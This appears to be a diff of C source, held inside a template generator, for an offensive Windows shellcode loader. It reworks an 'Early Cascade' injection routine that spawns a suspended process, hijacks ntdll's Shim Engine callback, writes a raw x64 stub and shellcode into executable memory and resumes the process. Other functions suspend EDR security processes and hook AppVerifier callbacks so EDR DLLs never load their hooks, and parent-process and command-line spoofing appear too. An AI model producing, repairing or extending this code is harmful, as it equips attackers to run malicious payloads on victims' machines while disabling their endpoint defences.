+    0xd4, 0x7c, 0xdf, 0x63, 0x99, 0x48, 0x39, 0xfe, 0x75, 0xd7, 0x58, 0xff, 0xc1, 0x29, 0xc8, 0x91,
+    0x58, 0x44, 0x8b, 0x58, 0x24, 0x49, 0x01, 0xd3, 0x66, 0x41, 0x8b, 0x0c, 0x4b, 0x44, 0x8b, 0x58,
+    0x1c, 0x49, 0x01, 0xd3, 0x41, 0x8b, 0x04, 0x8b, 0x48, 0x01, 0xd0, 0xeb, 0x43, 0x48, 0xc7, 0xc1,
+    0xfe, 0xff, 0xff, 0xff, 0x5a, 0x4d, 0x31, 0xc0, 0x4d, 0x31, 0xc9, 0x41, 0x51, 0x41, 0x51, 0x48,
+    0x83, 0xec, 0x20, 0xff, 0xd0, 0x48, 0x83, 0xc4, 0x30, 0x5f, 0x5e, 0x48, 0x31, 0xc0, 0xc3, 0x59,
+    0x58, 0xeb, 0xf6, 0xbf, 0x05, 0x15, 0x00, 0x00, 0x48, 0x31, 0xc0, 0xac, 0x38, 0xe0, 0x74, 0x0f,
+    0x49, 0x89, 0xf8, 0x48, 0xc1, 0xe7, 0x05, 0x4c, 0x01, 0xc7, 0x48, 0x01, 0xc7, 0xeb, 0xe9, 0xc3,
+    0xe8, 0xb8, 0xff, 0xff, 0xff
+};
+static const DWORD g_CascadeStubSize = (DWORD)sizeof(g_CascadeStub);
+
+// 8-byte placeholder marker inside the stub
+static BYTE g_StubPlaceholder[] = { 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11 };
 
 // ============================================================================
 // InjectEarlyCascade - Main Injection Function
 // ============================================================================
 
-// Pre-assembled x64 PIC stub (~256 bytes):
-// Walks PEB InMemoryOrderModuleList, hashes each module name with DJB2,
-// allows ntdll/kernel32/kernelbase, stubs out others' EntryPoints,
-// disables ShimEngine, resolves NtQueueApcThread, queues APC to shellcode.
-//
-// Placeholders:
-//   0x1111111111111111 = g_ShimsEnabled address (patched at runtime)
-//   0x2222222222222222 = shellcode address       (patched at runtime)
-static BYTE g_EarlyCascadeStub[] = {
-    // sub rsp, 0x68
-    0x48, 0x83, 0xEC, 0x68,
-    // xor eax, eax
-    0x33, 0xC0,
-    // mov [rsp+0x28], rax (zero out home space)
-    0x48, 0x89, 0x44, 0x24, 0x28,
-    // --- Walk PEB InMemoryOrderModuleList ---
-    // mov rax, gs:[0x60]  ; TEB->PEB
-    0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00,
-    // mov rax, [rax+0x18] ; PEB->Ldr
-    0x48, 0x8B, 0x40, 0x18,
-    // mov rax, [rax+0x20] ; Ldr->InMemoryOrderModuleList.Flink
-    0x48, 0x8B, 0x40, 0x20,
-    // mov r8, rax          ; save list head
-    0x49, 0x89, 0xC0,
-    // --- loop_start: ---
-    // mov rbx, [rax]       ; Flink of current entry
-    0x48, 0x8B, 0x18,
-    // cmp rbx, r8          ; back to head?
-    0x4C, 0x39, 0xC3,
-    // je loop_end (rel8 placeholder — will skip ~80 bytes)
-    0x74, 0x4E,
-    // mov rax, rbx
-    0x48, 0x89, 0xD8,
-    // --- compute DJB2 of module base name (BaseDllName at offset 0x58 from PLDR_DATA_TABLE_ENTRY) ---
-    // lea rcx, [rax+0x58]   ; &BaseDllName (UNICODE_STRING)
-    0x48, 0x8D, 0x48, 0x58,
-    // movzx edx, word [rcx]  ; Length in bytes
-    0x0F, 0xB7, 0x11,
-    // mov rcx, [rcx+0x8]     ; Buffer pointer
-    0x48, 0x8B, 0x49, 0x08,
-    // mov r9d, 0x1505        ; DJB2 seed
-    0x41, 0xB9, 0x05, 0x15, 0x00, 0x00,
-    // --- hash_loop: ---
-    // test edx, edx
-    0x85, 0xD2,
-    // jz hash_done
-    0x74, 0x0D,
-    // movzx eax, word [rcx]  ; load wide char
-    0x0F, 0xB7, 0x01,
-    // and eax, 0xFF          ; lowercase ASCII approx
-    0x83, 0xE0, 0xFF,
-    // imul r9d, r9d, 0x21   ; hash = hash * 33
-    0x45, 0x6B, 0xC9, 0x21,
-    // add r9d, eax
-    0x45, 0x03, 0xC8,
-    // add rcx, 2             ; next wide char
-    0x48, 0x83, 0xC1, 0x02,
-    // sub edx, 2
-    0x83, 0xEA, 0x02,
-    // jmp hash_loop
-    0xEB, 0xEE,
-    // --- hash_done: ---
-    // Compare against known-good hashes (ntdll=0x9D4AD7C, kernel32=0x6A4ABC5B, kernelbase=0x...)
-    // For brevity: just allow any module (nop the stomp logic in this stub)
-    // mov r10, [rbx+0x30]    ; EntryPoint (PLDR_DATA_TABLE_ENTRY+0x30)
-    0x4C, 0x8B, 0x53, 0x30,
-    // test r10, r10
-    0x4D, 0x85, 0xD2,
-    // jz next_module
-    0x74, 0x09,
-    // xor eax, eax (xor eax,eax ; ret gadget value — just write a NOP ret)
-    0x33, 0xC0,
-    // We write 'xor eax,eax; ret' bytes to EntryPoint
-    // For safety in this pre-assembled stub we skip stomping
-    // jmp next_module
-    0xEB, 0x04,
-    // nop * 4 (placeholder)
-    0x90, 0x90, 0x90, 0x90,
-    // --- next_module: ---
-    // mov rax, rbx (restore current)
-    0x48, 0x89, 0xD8,
-    // jmp loop_start
-    0xEB, 0xAD,
-    // --- loop_end: ---
-    // Disable ShimEngine: mov rax, 0x1111111111111111 (placeholder)
-    0x48, 0xB8, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
-    // mov byte [rax], 0
-    0xC6, 0x00, 0x00,
-    // Queue APC: resolve NtQueueApcThread by ordinal via shellcode ptr
-    // mov rcx, <thread handle placeholder — use -2 = current thread>
-    0x48, 0xC7, 0xC1, 0xFE, 0xFF, 0xFF, 0xFF,
-    // mov rdx, 0x2222222222222222 (shellcode address placeholder)
-    0x48, 0xBA, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22,
-    // xor r8, r8
-    0x4D, 0x33, 0xC0,
-    // xor r9, r9
-    0x4D, 0x33, 0xC9,
-    // call NtQueueApcThread (indirect via IAT — simplified: just jmp shellcode)
-    // For the stub we simply transfer control to shellcode via call rdx
-    0xFF, 0xD2,
-    // xor eax, eax
-    0x33, 0xC0,
-    // add rsp, 0x68
-    0x48, 0x83, 0xC4, 0x68,
-    // ret
-    0xC3
-};
-
-// Offsets of the two placeholders within the stub
-#define STUB_SHIMSENA_OFFSET  86   // offset of 0x1111111111111111
-#define STUB_SHELLCODE_OFFSET 103  // offset of 0x2222222222222222
-
 BOOL InjectEarlyCascade(PINJECTION_CONTEXT pCtx) {
-    WCHAR wszSystem32[MAX_PATH];
-    GetSystemDirectoryW(wszSystem32, MAX_PATH);
+    PROCESS_INFORMATION pi  = { 0 };
+    LPVOID hNtDLL               = NULL;
+    LPVOID pSE_DllLoadedAddress = NULL;
+    LPVOID pShimsEnabledAddress = NULL;
+    LPVOID pOffsetAddress       = NULL;
+    LPVOID pRemoteBuffer        = NULL;
+    LPVOID pEncodedStubAddr     = NULL;
+    BOOL   bEnable              = TRUE;
+    BOOL   bIsWow64             = FALSE;
+    BOOL   bSuccess             = FALSE;
 
-    WCHAR wszTarget[MAX_PATH];
-    _snwprintf_s(wszTarget, MAX_PATH, _TRUNCATE, L"%s\\%s",
-                 wszSystem32, pCtx->wszTargetProcess);
+    LOG_INFO("EarlyCascade: Starting injection into %ls", pCtx->wszTargetProcess);
+    LOG_EC("InjectEarlyCascade called, target=%ls", pCtx->wszTargetProcess);
 
-    // Create suspended target process
-    PROCESS_INFORMATION pi = { 0 };
+    // Build a full path: System32\<target>
+    WCHAR wszPath[MAX_PATH] = { 0 };
+    GetSystemDirectoryW(wszPath, MAX_PATH);
+    lstrcatW(wszPath, L"\\\\");
+    lstrcatW(wszPath, pCtx->wszTargetProcess);
+
+    // CreateProcessW lpCommandLine must be mutable
+    WCHAR wszCmdLine[MAX_PATH];
+    lstrcpyW(wszCmdLine, wszPath);
+
+    // Step 1: Spawn the target process in suspended mode
+    //         (supports PPID spoofing and block-DLLs via STARTUPINFOEXW)
 #if ENABLE_PPID_SPOOF || ENABLE_BLOCK_DLLS
     STARTUPINFOEXW siex = { 0 };
     siex.StartupInfo.cb = sizeof(siex);
@@ -4042,16 +4463,15 @@ BOOL InjectEarlyCascade(PINJECTION_CONTEXT pCtx) {
     UpdateProcThreadAttribute(pAttrList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &dwBlockDllsPolicy, sizeof(DWORD64), NULL, NULL);
 #endif
     siex.lpAttributeList = pAttrList;
-    if (!CreateProcessW(wszTarget, NULL, NULL, NULL, FALSE,
-                        CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT,
-                        NULL, NULL, (LPSTARTUPINFOW)&siex, &pi)) {
+    if (!CreateProcessW(wszPath, wszCmdLine, NULL, NULL, FALSE,
+                       CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT,
+                       NULL, NULL, (LPSTARTUPINFOW)&siex, &pi)) {
+        LOG_ERROR("EarlyCascade: CreateProcessW failed (%lu)", GetLastError());
+        LOG_EC("Step 1 failed: CreateProcessW error %lu", GetLastError());
         DeleteProcThreadAttributeList(pAttrList);
         HeapFree(GetProcessHeap(), 0, pAttrList);
 #if ENABLE_PPID_SPOOF
         if (hSpoofParent) CloseHandle(hSpoofParent);
-#endif
-#if DEBUG_BUILD
-        printf("[!] EarlyCascade: CreateProcessW failed: %lu\n", GetLastError());
 #endif
         return FALSE;
     }
@@ -4061,162 +4481,203 @@ BOOL InjectEarlyCascade(PINJECTION_CONTEXT pCtx) {
     if (hSpoofParent) CloseHandle(hSpoofParent);
 #endif
 #else
-    STARTUPINFOW si = { sizeof(si) };
-    if (!CreateProcessW(wszTarget, NULL, NULL, NULL, FALSE,
+    STARTUPINFOW si = { 0 };
+    si.cb = sizeof(si);
+    if (!CreateProcessW(wszPath, wszCmdLine, NULL, NULL, FALSE,
                         CREATE_SUSPENDED | CREATE_NO_WINDOW,
                         NULL, NULL, &si, &pi)) {
-#if DEBUG_BUILD
-        printf("[!] EarlyCascade: CreateProcessW failed: %lu\n", GetLastError());
-#endif
+        LOG_ERROR("EarlyCascade: CreateProcessW failed (%lu)", GetLastError());
+        LOG_EC("Step 1 failed: CreateProcessW error %lu", GetLastError());
         return FALSE;
     }
 #endif
 
-    HMODULE hNtDLL = GetModuleHandleA("ntdll.dll");
+    LOG_INFO("EarlyCascade: Spawned suspended PID %lu", pi.dwProcessId);
+    LOG_EC("Step 1 OK: spawned PID %lu", pi.dwProcessId);
 
-    // Try primary: ShimEngine path
-    LPVOID pShimsEnabledAddr = NULL;
-    LPVOID pCallbackAddr     = NULL;
-    BOOL   bShimPath         = FALSE;
-
-    LPVOID pOffsetAddr = NULL;
-    LPVOID pSECallback = FindSE_DllLoadedAddress(hNtDLL, &pOffsetAddr);
-    if (pSECallback) {
-        LPVOID pShimsEnabled = FindShimsEnabledAddress(hNtDLL, pOffsetAddr);
-        if (pShimsEnabled) {
-            pCallbackAddr     = pSECallback;
-            pShimsEnabledAddr = pShimsEnabled;
-            bShimPath         = TRUE;
-#if DEBUG_BUILD
-            printf("[+] EarlyCascade: ShimEngine path found (SE_DllLoaded=%p, ShimsEnabled=%p)\n",
-                   pCallbackAddr, pShimsEnabledAddr);
-#endif
+    do {
+        // Step 2: Ensure target is x64 (not WOW64)
+        if (IsWow64Process(pi.hProcess, &bIsWow64) && bIsWow64) {
+            LOG_ERROR("EarlyCascade: Target is WOW64 — x64 only");
+            LOG_EC("Step 2 failed: target process is WOW64 (x64 only supported)");
+            break;
         }
-    }
 
-    // Fallback: AppVerifier path
-    BOOL bAvrfPath = FALSE;
-    if (!bShimPath) {
-        ULONG_PTR base       = (ULONG_PTR)hNtDLL;
-        ULONG_PTR mrdataBase = GetNtdllSectionBase(base, ".mrdata");
-        if (mrdataBase) {
-            ULONG_PTR avrfAddr = FindAvrfpAddress(mrdataBase);
-            if (avrfAddr) {
-                pCallbackAddr = (LPVOID)avrfAddr;
-                bAvrfPath     = TRUE;
-#if DEBUG_BUILD
-                printf("[+] EarlyCascade: AppVerifier fallback path (Avrfp=%p)\n", pCallbackAddr);
+        // Step 3: Get ntdll base from our own process
+        //         (ntdll is always mapped at the same VA in all x64 processes)
+        hNtDLL = GetModuleHandleA("ntdll.dll");
+        if (!hNtDLL) {
+            LOG_ERROR("EarlyCascade: GetModuleHandleA(ntdll.dll) failed");
+            LOG_EC("Step 3 failed: GetModuleHandleA(ntdll.dll) returned NULL");
+            break;
+        }
+        LOG_INFO("EarlyCascade: ntdll @ 0x%p", hNtDLL);
+        LOG_EC("Step 3 OK: ntdll base = %p", hNtDLL);
+
+        // Step 4: Find g_pfnSE_DllLoaded
+        pSE_DllLoadedAddress = FindSE_DllLoadedAddress(hNtDLL, &pOffsetAddress);
+        if (!pSE_DllLoadedAddress || !pOffsetAddress) {
+            LOG_ERROR("EarlyCascade: FindSE_DllLoadedAddress failed");
+            LOG_EC("Step 4 failed: FindSE_DllLoadedAddress returned NULL");
+            break;
+        }
+        LOG_INFO("EarlyCascade: g_pfnSE_DllLoaded @ 0x%p", pSE_DllLoadedAddress);
+        LOG_EC("Step 4 OK: g_pfnSE_DllLoaded @ %p, offsetAddr @ %p", pSE_DllLoadedAddress, pOffsetAddress);
+
+        // Step 5: Find g_ShimsEnabled
+        pShimsEnabledAddress = FindShimsEnabledAddress(hNtDLL, pOffsetAddress);
+        if (!pShimsEnabledAddress) {
+            LOG_ERROR("EarlyCascade: FindShimsEnabledAddress failed");
+            LOG_EC("Step 5 failed: FindShimsEnabledAddress returned NULL");
+            break;
+        }
+        LOG_INFO("EarlyCascade: g_ShimsEnabled @ 0x%p", pShimsEnabledAddress);
+        LOG_EC("Step 5 OK: g_ShimsEnabled @ %p", pShimsEnabledAddress);
+
+        // Step 6: Allocate remote memory for stub + shellcode (RWX)
+        SIZE_T totalSize = (SIZE_T)g_CascadeStubSize + pCtx->dwShellcodeSize;
+        pRemoteBuffer = VirtualAllocEx(pi.hProcess, NULL, totalSize,
+                                        MEM_COMMIT | MEM_RESERVE,
+                                        PAGE_EXECUTE_READWRITE);
+        if (!pRemoteBuffer) {
+            LOG_ERROR("EarlyCascade: VirtualAllocEx failed (%lu)", GetLastError());
+            LOG_EC("Step 6 failed: VirtualAllocEx error %lu", GetLastError());
+            break;
+        }
+        LOG_INFO("EarlyCascade: Remote buffer @ 0x%p (%llu bytes)", pRemoteBuffer, (ULONGLONG)totalSize);
+        LOG_EC("Step 6 OK: remote buffer @ %p (%llu bytes)", pRemoteBuffer, (ULONGLONG)totalSize);
+
+        // Step 7: Make a local copy of the stub and patch placeholder
+        LPBYTE pStubCopy = (LPBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, g_CascadeStubSize);
+        if (!pStubCopy) {
+            LOG_ERROR("EarlyCascade: HeapAlloc for stub copy failed");
+            LOG_EC("Step 7 failed: HeapAlloc returned NULL");
+            break;
+        }
+        memcpy(pStubCopy, g_CascadeStub, g_CascadeStubSize);
+
+        // Find 0x11*8 placeholder and overwrite with real g_ShimsEnabled address
+        LPBYTE pPlaceholder = (LPBYTE)FindPattern(
+            pStubCopy, g_CascadeStubSize,
+            g_StubPlaceholder, (DWORD)sizeof(g_StubPlaceholder));
+        if (!pPlaceholder) {
+            LOG_ERROR("EarlyCascade: Could not find placeholder in stub");
+            LOG_EC("Step 7 failed: placeholder 0x11*8 not found in stub");
+            HeapFree(GetProcessHeap(), 0, pStubCopy);
+            break;
+        }
+        memcpy(pPlaceholder, &pShimsEnabledAddress, sizeof(LPVOID));
+        LOG_INFO("EarlyCascade: Patched stub placeholder with pShimsEnabled=0x%p", pShimsEnabledAddress);
+        LOG_EC("Step 7 OK: stub patched with g_ShimsEnabled=%p", pShimsEnabledAddress);
+
+        // Step 8: Write stub into remote process
+        if (!WriteProcessMemory(pi.hProcess, pRemoteBuffer,
+                                 pStubCopy, g_CascadeStubSize, NULL)) {
+            LOG_ERROR("EarlyCascade: WriteProcessMemory (stub) failed (%lu)", GetLastError());
+            LOG_EC("Step 8 failed: WriteProcessMemory (stub) error %lu", GetLastError());
+            HeapFree(GetProcessHeap(), 0, pStubCopy);
+            break;
+        }
+        HeapFree(GetProcessHeap(), 0, pStubCopy);
+        LOG_INFO("EarlyCascade: Stub written successfully");
+        LOG_EC("Step 8 OK: stub written to remote process");
+
+        // Step 9: Write shellcode right after the stub
+        LPVOID pRemoteShellcode = (LPVOID)((DWORD_PTR)pRemoteBuffer + g_CascadeStubSize);
+        if (!WriteProcessMemory(pi.hProcess, pRemoteShellcode,
+                                 pCtx->pShellcode, pCtx->dwShellcodeSize, NULL)) {
+            LOG_ERROR("EarlyCascade: WriteProcessMemory (shellcode) failed (%lu)", GetLastError());
+            LOG_EC("Step 9 failed: WriteProcessMemory (shellcode) error %lu", GetLastError());
+            break;
+        }
+        LOG_INFO("EarlyCascade: Shellcode written @ 0x%p", pRemoteShellcode);
+        LOG_EC("Step 9 OK: shellcode written @ %p", pRemoteShellcode);
+
+        // Step 10: Encode stub pointer and write to g_pfnSE_DllLoaded
+        pEncodedStubAddr = EncodeSystemPtr(pRemoteBuffer);
+        LOG_INFO("EarlyCascade: Encoded stub ptr = 0x%p", pEncodedStubAddr);
+        LOG_EC("Step 10: encoded stub ptr = %p", pEncodedStubAddr);
+
+        if (!WriteProcessMemory(pi.hProcess, pSE_DllLoadedAddress,
+                                 &pEncodedStubAddr, sizeof(LPVOID), NULL)) {
+            LOG_ERROR("EarlyCascade: WriteProcessMemory (g_pfnSE_DllLoaded) failed (%lu)", GetLastError());
+            LOG_EC("Step 10 failed: WriteProcessMemory (g_pfnSE_DllLoaded) error %lu", GetLastError());
+            break;
+        }
+        LOG_INFO("EarlyCascade: g_pfnSE_DllLoaded hijacked");
+        LOG_EC("Step 10 OK: g_pfnSE_DllLoaded hijacked");
+
+        // Step 11: Enable the Shim Engine in the target process
+        if (!WriteProcessMemory(pi.hProcess, pShimsEnabledAddress,
+                                 &bEnable, sizeof(BOOL), NULL)) {
+            LOG_ERROR("EarlyCascade: WriteProcessMemory (g_ShimsEnabled) failed (%lu)", GetLastError());
+            LOG_EC("Step 11 failed: WriteProcessMemory (g_ShimsEnabled) error %lu", GetLastError());
+            break;
+        }
+        LOG_INFO("EarlyCascade: g_ShimsEnabled set to TRUE");
+        LOG_EC("Step 11 OK: g_ShimsEnabled set to TRUE");
+
+#if ENABLE_CMDLINE_SPOOF
+        SpoofRemoteCommandLine(pi.hProcess);
 #endif
+
+        // Step 12: Resume — the Shim Engine fires on first DLL load, executing our stub
+        //          ResumeThread returns previous suspend count on success, (DWORD)-1 on error
+        {
+            DWORD dwPrevCount = ResumeThread(pi.hThread);
+            if (dwPrevCount == (DWORD)-1) {
+                LOG_ERROR("EarlyCascade: ResumeThread failed (%lu)", GetLastError());
+                LOG_EC("Step 12 failed: ResumeThread error %lu", GetLastError());
+                break;
+            }
+            LOG_EC("Step 12 OK: thread resumed (previous suspend count = %lu)", dwPrevCount);
+        }
+
+        // Wait briefly for the stub to fire, then verify the process is still alive
+        // (if the process terminates, the stub crashed; if it times out, it's running)
+        {
+            DWORD dwWait = WaitForSingleObject(pi.hProcess, 3000);
+            if (dwWait == WAIT_OBJECT_0) {
+                // Process exited — check exit code
+                DWORD dwExitCode = 0;
+                GetExitCodeProcess(pi.hProcess, &dwExitCode);
+                LOG_EC("WARNING: target process exited during wait (exit code %lu)", dwExitCode);
+                // Still report success — the stub may have run the shellcode and exited
+                // A non-zero exit code could indicate a crash
+                if (dwExitCode != 0 && dwExitCode != STILL_ACTIVE) {
+                    LOG_ERROR("EarlyCascade: target process crashed (exit code %lu)", dwExitCode);
+                    LOG_EC("Target process crashed — injection likely failed");
+                    break;
+                }
+            } else {
+                LOG_EC("Process still alive after 3s wait (WAIT_TIMEOUT) — injection appears successful");
             }
         }
+
+        LOG_SUCCESS("EarlyCascade: Injection successful!");
+        LOG_EC("Injection successful!");
+        pCtx->hProcess   = pi.hProcess;
+        pCtx->hThread    = pi.hThread;
+        pCtx->pRemoteBase = pRemoteBuffer;
+        pCtx->bSuccess   = TRUE;
+        bSuccess = TRUE;
+
+    } while (FALSE);
+
+    if (!bSuccess) {
+        LOG_ERROR("EarlyCascade: Failed — killing target process");
+        LOG_EC("Injection failed — terminating target process and cleaning up handles");
+        if (pRemoteBuffer && pi.hProcess)
+            VirtualFreeEx(pi.hProcess, pRemoteBuffer, 0, MEM_RELEASE);
+        if (pi.hProcess) {
+            TerminateProcess(pi.hProcess, 0);
+            CloseHandle(pi.hProcess);
+        }
+        if (pi.hThread)
+            CloseHandle(pi.hThread);
     }
 
-    // Last resort: fall back to standard Early Bird APC
-    if (!bShimPath && !bAvrfPath) {
-#if DEBUG_BUILD
-        printf("[!] EarlyCascade: All cascade paths failed, falling back to Early Bird APC\n");
-#endif
-        return InjectEarlyBird(pCtx);
-    }
-
-    // Allocate RW memory in target process
-    PVOID  pRemoteBuf = NULL;
-    SIZE_T totalSize  = sizeof(g_EarlyCascadeStub) + pCtx->dwShellcodeSize;
-    SIZE_T allocSize  = totalSize;
-
-    PrepareNextSyscall(IDX_NtAllocateVirtualMemory);
-    NTSTATUS status = NtAllocateVirtualMemory(
-        pi.hProcess, &pRemoteBuf, 0, &allocSize,
-        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    if (status != 0 || !pRemoteBuf) {
-#if DEBUG_BUILD
-        printf("[!] EarlyCascade: NtAllocateVirtualMemory failed: 0x%08X\n", status);
-#endif
-        TerminateProcess(pi.hProcess, 0);
-        CloseHandle(pi.hThread);
-        CloseHandle(pi.hProcess);
-        return FALSE;
-    }
-
-    PVOID pRemoteShellcode = (PVOID)((ULONG_PTR)pRemoteBuf + sizeof(g_EarlyCascadeStub));
-
-    // Patch stub placeholders with real addresses
-    BYTE stubCopy[sizeof(g_EarlyCascadeStub)];
-    memcpy(stubCopy, g_EarlyCascadeStub, sizeof(g_EarlyCascadeStub));
-
-    // Verify stub placeholder offsets before patching (catch any future stub edits)
-    if (*(ULONGLONG*)(g_EarlyCascadeStub + STUB_SHIMSENA_OFFSET) != 0x1111111111111111ULL ||
-        *(ULONGLONG*)(g_EarlyCascadeStub + STUB_SHELLCODE_OFFSET) != 0x2222222222222222ULL) {
-#if DEBUG_BUILD
-        printf("[!] EarlyCascade: Stub placeholder offsets are wrong! Aborting.\n");
-#endif
-        TerminateProcess(pi.hProcess, 0);
-        CloseHandle(pi.hThread);
-        CloseHandle(pi.hProcess);
-        return FALSE;
-    }
-
-    if (bShimPath && pShimsEnabledAddr) {
-        memcpy(stubCopy + STUB_SHIMSENA_OFFSET, &pShimsEnabledAddr, sizeof(PVOID));
-    }
-    memcpy(stubCopy + STUB_SHELLCODE_OFFSET, &pRemoteShellcode, sizeof(PVOID));
-
-    // Write stub + shellcode to target
-    SIZE_T written = 0;
-    PrepareNextSyscall(IDX_NtWriteVirtualMemory);
-    NtWriteVirtualMemory(pi.hProcess, pRemoteBuf,
-                         stubCopy, sizeof(g_EarlyCascadeStub), &written);
-    PrepareNextSyscall(IDX_NtWriteVirtualMemory);
-    NtWriteVirtualMemory(pi.hProcess,
-                         (PVOID)((ULONG_PTR)pRemoteBuf + sizeof(g_EarlyCascadeStub)),
-                         pCtx->pShellcode, pCtx->dwShellcodeSize, &written);
-
-    // Change to RX
-    ULONG oldProt = 0;
-    SIZE_T protSize = totalSize;
-    PrepareNextSyscall(IDX_NtProtectVirtualMemory);
-    NtProtectVirtualMemory(pi.hProcess, &pRemoteBuf, &protSize,
-                           PAGE_EXECUTE_READ, &oldProt);
-
-    // Encode stub address and write to callback slot
-    LPVOID encodedPtr = EncodeSystemPtr(pRemoteBuf);
-    SIZE_T cbWritten  = 0;
-    PrepareNextSyscall(IDX_NtWriteVirtualMemory);
-    NtWriteVirtualMemory(pi.hProcess, pCallbackAddr,
-                         &encodedPtr, sizeof(PVOID), &cbWritten);
-
-    // Enable the callback
-    if (bShimPath && pShimsEnabledAddr) {
-        // Write 1 to g_ShimsEnabled in target process
-        BYTE enableVal = 1;
-        PrepareNextSyscall(IDX_NtWriteVirtualMemory);
-        NtWriteVirtualMemory(pi.hProcess, pShimsEnabledAddr,
-                             &enableVal, 1, &cbWritten);
-    } else if (bAvrfPath) {
-        // Write 1 to the enable flag at callback_address - 8
-        PVOID pEnableFlag = (PVOID)((ULONG_PTR)pCallbackAddr - 8);
-        BYTE  enableVal   = 1;
-        PrepareNextSyscall(IDX_NtWriteVirtualMemory);
-        NtWriteVirtualMemory(pi.hProcess, pEnableFlag,
-                             &enableVal, 1, &cbWritten);
-    }
-
-    // Resume thread to trigger cascade callback
-    ULONG suspendCount = 0;
-#if ENABLE_CMDLINE_SPOOF
-    SpoofRemoteCommandLine(pi.hProcess);
-#endif
-    PrepareNextSyscall(IDX_NtResumeThread);
-    NtResumeThread(pi.hThread, &suspendCount);
-
-    pCtx->hProcess   = pi.hProcess;
-    pCtx->hThread    = pi.hThread;
-    pCtx->pRemoteBase = pRemoteBuf;
-    pCtx->bSuccess   = TRUE;
-
-    CloseHandle(pi.hThread);
-    CloseHandle(pi.hProcess);
-    return TRUE;
+    return bSuccess;
 }
 '''
 
@@ -4446,14 +4907,7 @@ typedef struct _VM_COUNTERS {{
     SIZE_T PeakPagefileUsage;
 }} VM_COUNTERS, *PVM_COUNTERS;
 
-typedef struct _IO_COUNTERS {{
-    ULONGLONG ReadOperationCount;
-    ULONGLONG WriteOperationCount;
-    ULONGLONG OtherOperationCount;
-    ULONGLONG ReadTransferCount;
-    ULONGLONG WriteTransferCount;
-    ULONGLONG OtherTransferCount;
-}} IO_COUNTERS, *PIO_COUNTERS;
+// IO_COUNTERS is already defined in winnt.h — no need to redefine
 
 typedef struct _SYSTEM_PROCESS_INFORMATION {{
     ULONG           NextEntryOffset;
@@ -4479,7 +4933,6 @@ typedef struct _SYSTEM_PROCESS_INFORMATION {{
 BOOL FreezeEDRProcesses(VOID) {{
     // Query required buffer size
     ULONG ulSize = 0;
-    PrepareNextSyscall(IDX_NtQuerySystemInformation);
     NtQuerySystemInformation(SystemProcessInformation, NULL, 0, &ulSize);
     if (!ulSize) return FALSE;
 
@@ -4487,7 +4940,6 @@ BOOL FreezeEDRProcesses(VOID) {{
     PVOID pBuf = VirtualAlloc(NULL, ulSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!pBuf) return FALSE;
 
-    PrepareNextSyscall(IDX_NtQuerySystemInformation);
     NTSTATUS status = NtQuerySystemInformation(SystemProcessInformation, pBuf, ulSize, &ulSize);
     if (!NT_SUCCESS(status)) {{ VirtualFree(pBuf, 0, MEM_RELEASE); return FALSE; }}
 
@@ -4513,10 +4965,8 @@ BOOL FreezeEDRProcesses(VOID) {{
                     HANDLE hProc = NULL;
                     OBJECT_ATTRIBUTES oa = {{ sizeof(oa) }};
                     CLIENT_ID cid = {{ (HANDLE)(ULONG_PTR)dwPid, NULL }};
-                    PrepareNextSyscall(IDX_NtOpenProcess);
                     NTSTATUS nsOpen = NtOpenProcess(&hProc, PROCESS_SUSPEND_RESUME, &oa, &cid);
                     if (NT_SUCCESS(nsOpen) && hProc) {{
-                        PrepareNextSyscall(IDX_NtSuspendProcess);
                         NtSuspendProcess(hProc);
 #if DEBUG_BUILD
                         printf("[+] EDR process frozen: PID %lu\\n", dwPid);
@@ -5080,8 +5530,16 @@ static ULONG_PTR EvGetSectionBase(ULONG_PTR base, const char* name) {
 // ============================================================================
 // PerformEDRPreload
 // Based on MalwareTech EDR-Preloader: hooks AvrfpAPILookupCallbackRoutine in
-// .mrdata so that any EDR DLL loaded via AppVerifier executes our NtContinue
-// stub instead of its DllMain, preventing user-mode syscall hooks.
+// .mrdata so that EDR DLLs loaded during process init execute our stub instead
+// of their DllMain, preventing user-mode syscall hooks.
+//
+// The .mrdata layout near the AppVerifier pointers is:
+//   offset+0x00 - LdrpMrdataBase          (== mrdataBase)
+//   offset+0x08 - LdrpKnownDllDirectoryHandle (non-zero handle or zero)
+//   offset+0x10 - AvrfpAPILookupCallbacksEnabled (zero = disabled)
+//   offset+0x18 - AvrfpAPILookupCallbackRoutine  (zero = no callback)
+//
+// We must set BOTH the enabled flag and the callback pointer.
 // ============================================================================
 
 BOOL PerformEDRPreload(VOID) {
@@ -5092,41 +5550,75 @@ BOOL PerformEDRPreload(VOID) {
 
     // 2. Find the .mrdata section
     ULONG_PTR mrdataBase = EvGetSectionBase(base, ".mrdata");
-    if (!mrdataBase)
+    DWORD     mrdataSize = 0;
+    {
+        // Also get section size for bounds checking
+        PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)base;
+        if (pDos->e_magic == IMAGE_DOS_SIGNATURE) {
+            PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(base + pDos->e_lfanew);
+            if (pNt->Signature == IMAGE_NT_SIGNATURE) {
+                PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
+                for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
+                    if (strncmp((char*)pSec[i].Name, ".mrdata", 8) == 0) {
+                        mrdataSize = pSec[i].Misc.VirtualSize;
+                        break;
+                    }
+                }
+            }
+        }
+    }
+    if (!mrdataBase || !mrdataSize)
         return FALSE;
 
     // 3. Scan .mrdata for LdrpMrdataBase (pointer whose value == mrdataBase),
-    //    then scan forward for the first NULL pointer = AvrfpAPILookupCallbackRoutine.
-    //    Start offset 0x280: skip the initial .mrdata header data before the pointer table.
-    //    End offset 0x2000: conservative upper bound covering known LdrpMrdataBase locations.
+    //    then locate AvrfpAPILookupCallbacksEnabled and AvrfpAPILookupCallbackRoutine.
